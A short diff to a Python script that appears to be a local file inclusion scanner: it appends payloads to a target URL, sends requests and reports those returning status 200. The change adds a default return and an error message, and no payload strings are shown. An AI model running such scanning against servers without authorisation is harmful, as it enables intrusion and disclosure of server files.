@@ -10,6 +10,7 @@ def testExtention(url):
         ext = re.compile(".*{}".format(extension.strip()))
         if ext.search(url):
             return True, extension
+    return False, " "
 
 
 def LFIinj(url, extension):
@@ -20,6 +21,8 @@ def LFIinj(url, extension):
         newUrl = newUrl + payload
         response = requests.get(newUrl.strip())
         if response.status_code == 200:
+            # print this
+            # responseList = response.text
             print("{} :[+] FOUNDED using : {}".format(counter, payload))
             counter = counter + 1
             choose = input("[?] Find another payload (yes or no)?")
@@ -42,4 +45,6 @@ if __name__ == "__main__":
         print("URL querying file with extention {}".format(extention))
         print("Start LFI injection")
         successPayloads = LFIinj(url, extention)
+    else:
+        print("[-] Must be querying file from server ")
 
